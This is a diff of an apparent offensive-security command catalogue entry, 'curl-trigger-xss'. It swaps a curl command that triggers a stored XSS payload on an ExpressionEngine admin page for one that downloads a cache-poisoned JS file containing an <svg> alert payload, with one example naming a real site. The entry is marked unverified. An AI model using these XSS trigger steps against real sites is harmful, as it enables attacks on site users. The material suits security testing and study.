@@ -1,64 +1,62 @@
 ---
-id: cmd-uuid-002
-data: >-
-  curl -v -b cookies.txt
-  'http://target/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf'
-tags:
-  - xss
-  - trigger
-  - http
+id: h8i9j0k1-l2m3-4567-hijk-890123456789
+name: curl-trigger-xss
 type: command
-output: null
 executor: bash
+data: curl URL > poisoned.js
+output: null
+created_at: '2024-01-01T00:00:00Z'
+updated_at: '2025-12-14T17:33:24.632Z'
 platforms:
   - Linux
-  - Web
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:27.062Z'
+  - macOS
+  - Windows
+tags:
+  - http
+  - xss
+  - trigger
 verified: false
 validated: true
 submitted: true
 ---
+
 # curl-trigger-xss
 
 ## Command
 
 ```bash
-curl -v -b cookies.txt 'http://target/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf'
+curl URL > poisoned.js
 ```
 
 ## Description
 
-This command fetches an admin page to trigger the execution of a stored XSS payload, using verbose mode to inspect the response for injected script tags.
+Downloads the poisoned JS file for local execution in a browser to trigger XSS.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-v` | Verbose output for headers and response | Yes |
-| `-b cookies.txt` | Session cookies | Yes |
-| URL | Admin page URL with session hash | Yes |
+| `URL` | Poisoned endpoint URL | Yes |
+| `> poisoned.js` | Redirect output to file | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -v -b cookies.txt 'http://target/admin/page'
+curl https://example.com/poisoned.js > test.js
 ```
 
 ### Advanced Usage
 
-Pipe to grep for script tags:
-
 ```bash
-curl -v -b cookies.txt 'http://target/admin/page' | grep -i script
+curl https://www.abritel.fr/...php.js?xxxd > poisoned.js && cat poisoned.js | grep svg
 ```
 
 ## Expected Output
 
-Full HTTP response including HTML body with injected <script>alert('stored xss')</script>. Look for the payload in the output.
+File containing JS with injected <svg> payload; browser execution shows alert.
 
 ## Related
 
-- [[Related Procedure: Inject-Stored-XSS-Payload-into-ExpressionEngine-General-Configuration]]
+- [[Related Procedure: Trigger-XSS-via-Poisoned-Cache]]
